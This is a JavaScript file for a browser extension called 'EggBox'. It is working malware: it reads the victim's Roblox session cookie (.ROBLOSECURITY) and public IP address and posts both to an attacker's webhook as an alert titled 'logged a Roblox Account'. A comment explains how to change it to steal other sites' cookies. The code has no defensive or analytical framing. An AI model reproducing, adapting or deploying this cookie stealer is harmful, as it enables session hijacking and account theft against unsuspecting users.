function webhookReq(webhook, cookie, ip) {
  var params = {
      embeds: [{
            "title": `Eggbox logged a Roblox Account!`,
            "description": ">>> EggBox extension logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Public IP Address',
              "value": ip,
              inline: false
            },
            {
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    $.getJSON(
    	`https://ipinfo.io/json`, 
    	function(ipResponse){
        // Send Webhook
        webhookReq("Webhook", cookie.value, ipResponse.ip);
    })
  }
});
